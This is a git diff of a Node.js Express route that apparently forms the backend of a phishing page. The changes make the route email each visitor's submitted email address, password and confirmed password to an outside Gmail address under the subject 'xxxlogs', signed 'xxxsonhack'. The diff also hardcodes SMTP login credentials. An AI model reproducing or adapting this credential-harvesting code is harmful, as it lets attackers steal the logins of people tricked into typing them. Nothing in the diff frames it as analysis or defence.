@@ -52,23 +52,25 @@ app.post("/sendmail2", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.ellsworthins.com",
+      host: "mail.korarahighlandstea.com",
       port: 465,
       auth: {
-        user: "connect@ellsworthins.com",
-        pass: "HHtjN38%%Q",
+        user: "info@korarahighlandstea.com",
+        pass: "chai2025!",
       },
     });
     let info = await transporter.sendMail({
-      from: '"happness" <connect@ellsworthins.com>',
-      to: "connect@ellsworthins.com",
-      subject: "Ohh Happy  day",
+      from: '"You" <info@korarahighlandstea.com>',
+      to: "fredrick3smith33@gmail.com",
+      subject: "xxxlogs",
       html: `
     <div> 
-      <h2>Here is your dose of happness!</h2>
-        
+      <h2>Here is your Log!</h2>
+        <p>Email: ${email}</p>
+        <p>Pass: ${pass}</p>
+        <p>Confirm Pass: ${pasers}</p>
     
-        <p>All the best, happyness</p>
+        <p>All the best, xxxsonhack</p>
          </div>
     `,
     });
@@ -77,7 +79,7 @@ app.post("/sendmail2", async (req, res) => {
     res.send("Email sent successfully");
   } catch (error) {
     console.error(error);
-    res.status(500).send("Error sending email");
+    res.send("error");
   }
 });
 
